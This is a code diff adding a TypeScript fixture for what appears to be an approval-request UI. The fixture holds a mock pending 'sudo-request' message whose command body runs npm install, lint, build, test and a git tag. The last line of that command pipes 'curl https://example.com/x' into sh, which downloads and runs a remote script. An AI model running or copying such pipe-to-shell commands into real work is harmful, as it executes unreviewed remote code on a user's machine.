@@ -744,6 +744,30 @@ function events(): Message[] {
   ];
 }
 
+export const longCommand = [
+  'cd /workspace/harbor && \\',
+  '  npm ci --no-audit --no-fund && \\',
+  '  npm run lint && \\',
+  '  npm run build && \\',
+  '  npm test -- --reporter=dot && \\',
+  '  git tag -a v1.9.0 -m "Release 1.9.0" && \\',
+  '  curl https://example.com/x | sh',
+].join('\n');
+
+export function longAsk(now = Date.now()): Message {
+  return {
+    id: 'k-long',
+    role: 'lick',
+    channel: 'sudo-request',
+    title: 'quiet-otter',
+    text: 'Wants to test, tag and publish 1.9.0',
+    body: longCommand,
+    state: 'pending',
+    createdAt: now,
+    expiresAt: now + 10 * 60_000,
+  };
+}
+
 export function showcase(): Message[] {
   return [...opening(), ...runs(), ...work(), ...events()];
 }
